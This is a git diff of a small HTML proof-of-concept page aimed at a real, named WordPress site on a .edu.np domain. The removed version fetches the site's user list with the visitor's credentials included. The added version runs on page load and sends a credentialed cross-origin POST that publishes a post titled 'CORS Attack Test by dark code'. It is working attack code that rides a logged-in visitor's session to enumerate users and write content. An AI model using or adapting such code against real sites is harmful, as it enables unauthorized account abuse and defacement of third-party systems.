@@ -1,32 +1,29 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8" />
-  <title>CORS Subdomain Test</title>
-</head>
+<html>
+<head><title>PoC: Add Post</title></head>
 <body>
-  <h1>CORS Test on Subdomain</h1>
-  <button id="fetchBtn">Fetch Data from Target API</button>
-  <pre id="output" style="white-space: pre-wrap; border: 1px solid #ccc; padding: 10px; margin-top: 10px;"></pre>
-
-  <script>
-    document.getElementById('fetchBtn').addEventListener('click', () => {
-      fetch('https://lahanparagon.edu.np/wp-json/wp/v2/users
-', {
-        method: 'GET',
-        credentials: 'include' // Sends cookies/session info with the request
-      })
-      .then(response => {
-        if (!response.ok) throw new Error('Network response was not ok: ' + response.status);
-        return response.text(); // Use .json() if you expect JSON response
-      })
-      .then(data => {
-        document.getElementById('output').textContent = 'Success! Data received:\n\n' + data;
-      })
-      .catch(error => {
-        document.getElementById('output').textContent = 'Error: ' + error.message;
-      });
-    });
-  </script>
+<h2>Creating post via CORS attack</h2>
+<script>
+fetch("https://lahanparagon.edu.np/wp-json/wp/v2/posts", {
+  method: "POST",
+  credentials: "include",
+  headers: {
+    "Content-Type": "application/json"
+  },
+  body: JSON.stringify({
+    title: "CORS Attack Test by dark code",
+    content: "If you see this, the API is vulnerable.",
+    status: "publish"  // could be "draft" or "private"
+  })
+})
+.then(response => response.json())
+.then(data => {
+  console.log("Response:", data);
+  alert("Post attempt complete. Check console/logs.");
+})
+.catch(error => {
+  console.error("Error:", error);
+});
+</script>
 </body>
 </html>
